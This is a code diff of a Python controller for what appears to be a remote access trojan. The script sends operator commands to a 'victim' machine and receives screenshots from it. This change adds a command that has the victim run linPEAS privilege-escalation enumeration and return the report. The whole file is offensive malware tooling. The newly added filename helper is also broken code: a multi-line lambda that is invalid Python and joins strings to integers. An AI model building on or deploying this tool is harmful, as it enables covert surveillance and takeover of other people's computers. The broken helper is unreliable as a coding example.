@@ -32,9 +32,9 @@ def recibir_mensaje(conn, buffer_size=4096):
         return None
 
 # Returns the number of the new file
-def existsFile():
+def existsFile(baseFileName,extension):
     number = 0
-    while os.path.isfile("screenshot" + str(number) + ".png"):
+    while os.path.isfile(baseFileName + str(number) + extension):
         number += 1
     return number
 
@@ -51,19 +51,28 @@ def recvLen():
             print(f)
             
 
-def recvFiles():
+def recvFiles(filename, extension):
     global conn, stop
     try:
         ln = recvLen()
         totalRecv = 0
+        
+        file = lambda filename, extension:
+            name = ""
+            if extension == ".png":
+                name = filename + existsFile(filename,".png") + ".png"
+            else:
+                name = filename + existsFile(filename, extension) + extension
+                
+            return name
+        
         if ln != None:
-            
-            with open(f"screenshot{existsFile()}.png", "wb") as f:
+            with open(file(filename,extension), "wb") as f:
                 while totalRecv != ln:
                     data = conn.recv(4096)
                     f.write(data)
                     totalRecv += len(data)
-                print("[+] SCREENSHOT SAVED")
+                print("[+] FILE SAVED")
             stop = False
         else:
             print("[-] ERROR ")
@@ -72,9 +81,7 @@ def recvFiles():
         stop = False 
 
 
-def pepinoFilter(packet):
-    if packet == "sF":
-        stop = False
+
     
 
 def iniciar_servidor(host='127.0.0.1', port=5656):
@@ -110,6 +117,26 @@ def handler(sig, frame):
     print(f"\nByeee!{Style.RESET_ALL}")
     stopThread = True
     sys.exit(0)
+
+def filterCommand(command):
+    global stop
+    if command == "screenshot":
+        print("[+] Receiving data...")
+        stop = True
+        send(command)
+        recvFiles("screenshot",".png")
+    elif command == "help":
+        helpPrinter()
+        
+    elif command == "linpeas":
+        stop = True
+        send(command)
+        recvFiles("linPEAS", ".txt")    
+    else:  
+        # SEND THE COMMAND TO THE VICTIM    
+        send(command)
+                
+
                     
 def helpPrinter():
     print("""
@@ -160,20 +187,6 @@ if __name__ == '__main__':
     while True:
         if isConnected:
             data = input("")
-            
-            if data == "screenshot":
-                print("[+] Receiving data...")
-                stop = True
-                send(data)
-                recvFiles()
-            elif data == "help":
-                helpPrinter()
-            
-            else:  
-            # SEND THE DATA TO THE VICTIM    
-                send(data)
-                
-                
-                
+            filterCommand(data)
         else:
             time.sleep(1)
